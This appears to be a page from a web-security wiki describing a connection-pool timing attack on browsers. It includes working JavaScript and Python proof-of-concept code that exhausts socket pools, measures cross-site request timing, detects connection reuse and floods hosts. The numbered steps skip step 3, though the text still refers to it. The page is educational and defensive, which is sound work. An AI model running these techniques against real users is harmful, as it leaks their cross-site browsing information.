+++
title = "Connection Pool"
description = ""
date = "2020-10-01"
category = "Attack"
abuse = [
    "Connection Pool",
    "Browser Limits",
]
defenses = [
    "Fetch Metadata",
    "SameSite Cookies",
]
menu = "main"
+++

Another way to measure the network timing of a request consists of abusing the socket pool of a browser [^1]. Browsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources, browsers have to impose a limit.

To exploit the existence of this limit, attackers can:
1. Check what the limit of the browser is, for example 256 global sockets for TCP and 6000 global sockets for UDP. [^2][^7]
2. Block {{< katex>}}255{{< /katex >}} sockets for a long period of time by performing {{< katex>}}255{{< /katex >}} requests to different hosts that simply hang the connection
```javascript
// Client
for(let i=0; i<255; i++) fetch('https://'+i+'.example.com/', {mode: "no-cors", cache: "no-store"});
```
```python
# Server
from http.server import BaseHTTPRequestHandler, HTTPServer
import time

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        time.sleep(float(100000))
        self.send_response(200)
        self.send_header('Cache-Control', 'no-store')
        self.end_headers()

with HTTPServer(('', 8000), handler) as server:
    server.serve_forever()
```
4. Use the {{< katex>}}256^{th}{{< /katex >}} socket by performing a request to the target page.
5. Perform a {{< katex>}}257^{th}{{< /katex >}} request to another host. Since all the sockets are being used (in steps 2 and 3), this request must wait until the pool receives an available socket. This waiting period provides the attacker with the network timing of the {{< katex>}}256^{th}{{< /katex >}} socket, which belongs to the target page. This works because the {{< katex>}}255{{< /katex >}} sockets in step 2 are still blocked, so if the pool received an available socket, it was caused by the release of the socket in step 3. The time to release the {{< katex>}}256^{th}{{< /katex >}} socket is directly connected with the time taken to complete the request.
```javascript
performance.clearResourceTimings();
await fetch(location.href, {cache: "no-store"});
await new Promise(r => setTimeout(r, 1000));
let data = performance.getEntries().pop();
let type = (data.connectStart === data.startTime) ? 'reused' : 'new';
console.log('Time spent: ' + data.duration + ' on ' + type + ' connection.');
```

## Connection reuse
With HTTP/1.1 (TCP) and HTTP/2 (TCP) and HTTP/3 (UDP) requests may reuse an existing connection for a host to improve performance. [^3][^4]
HTTP/2 also has Connection Coalescing which allows different hostnames that are accessible from the same web server to reuse a connection. [^8]
This is currently keyed by if credentials are included in the request.
Since a reused connection is normally faster this could allow for detecting if a site has connected to a host excluding anything that’s been cached and leaking information about the cross-site request by abusing Stream prioritization and HPACK compression. [^5]
Connections may get closed if they are left idle or the sockets are exhausted, for example 256 connections for HTTP/2 or 30 seconds idle for HTTP/3. [^2][^6]
This may also leak when the connection happened and the browser can have per connection limits and on how many connections are allowed per host, for example 6 connections per host. [^2]
```javascript
// Detect if a HTTP/3 request was made to a certain host in the last 20 seconds.
await new Promise(r => setTimeout(r, 10000));

// Check for connection reuse for when there’s a Timing-Allow-Origin header.
async function isConnected(url) {
    performance.clearResourceTimings();
    try {
        await fetch(url, {
            cache: "no-store",
            credentials: "include"
        });
    } catch {}
    await new Promise(r => setTimeout(r, 1000));
    let data = performance.getEntries().pop();
    // Allowed to read timing information.
    // Same-origin or the Timing-Allow-Origin header.
    console.log("Protocol: " + data.nextHopProtocol);
    return (data.connectStart === data.startTime);
}

// Check for connection reuse for when there’s no Timing-Allow-Origin header. (less reliable)
async function isConnected2(url, max = 50) {
    let start = performance.now();
    try {
        await fetch(url, {
            cache: "no-store",
            method: "GET",
            mode: "no-cors",
            credentials: "include"
        });
    } catch {}
    let duration = performance.now() - start;
    
    let start2 = performance.now();
    try {
        await fetch(url, {
            cache: "no-store",
            method: "GET",
            mode: "no-cors",
            credentials: "include"
        });
    } catch {}
    let duration2 = performance.now() - start2;
    return (duration - duration2 < max);
}

await isConnected2('https://example.com/404');
```

## Skipping dependences
If a connection is exhausted or there’s to many sockets open then requests for code from a host may fail resulting in different behaviour.
```javascript
for (let i = 0; i < 500; i++) request();

async function request() {
    let x = new AbortController();
    fetch('https://example.org', {
        mode: "no-cors",
        //credentials: 'include',
        cache: "no-store",
        signal: x.signal
    });
    await new Promise(r => setTimeout(r, 10));
    x.abort();
    request();
}

open('https://example.com', '' , 'popup=1');
```
Overload a connection so it never requests to that host.
```javascript
let x = [...Array(100000)].join(',');
function request() {
    fetch('https://example.com', {mode: "no-cors", cache: "no-store", method: 'POST', body: x}).then(request);
}
for(let i=0; i<10; i++) request();
```
## Defense

| [SameSite Cookies (Lax)]({{< ref "/docs/defenses/opt-in/same-site-cookies.md" >}}) | [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) | [Framing Protections]({{< ref "/docs/defenses/opt-in/xfo.md" >}}) | [Isolation Policies]({{< ref "/docs/defenses/isolation-policies" >}}) |
| :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :-------------------------------------------------------------------: |
|                                         ❌                                          |                          ❌                          |                                 ❌                                 |                                   ❌                                   |


{{< hint info >}}
Similar to [partitioned caches]({{< ref "../../defenses/secure-defaults/partitioned-cache.md" >}}), some browsers are considering to extend the principle of "split per site/origin" of resources to [socket pools](https://bugzilla.mozilla.org/show_bug.cgi?id=1572544).
{{< /hint >}}

## References

[^1]: Leak cross-window request timing by exhausting connection pool, [link](https://bugs.chromium.org/p/chromium/issues/detail?id=843157)
[^2]: client_socket_pool_manager.cc, [link](https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool_manager.cc)
[^3]: rfc9113 Connection Reuse, [link](https://httpwg.org/specs/rfc9113.html#rfc.section.9.1.1)
[^4]: rfc9114 Connection Reuse, [link](https://httpwg.org/specs/rfc9114.html#rfc.section.3.3)
[^5]: rfc9113 Remote Timing Attacks, [link](https://httpwg.org/specs/rfc9113.html#rfc.section.10.9)
[^6]: quic_context.h, [link](https://source.chromium.org/chromium/chromium/src/+/main:net/quic/quic_context.h)
[^7]: features.cc, [link](https://source.chromium.org/chromium/chromium/src/+/main:net/base/features.cc)
[^8]: HTTP/2 CONNECTION COALESCING, [link](https://daniel.haxx.se/blog/2016/08/18/http2-connection-coalescing/)
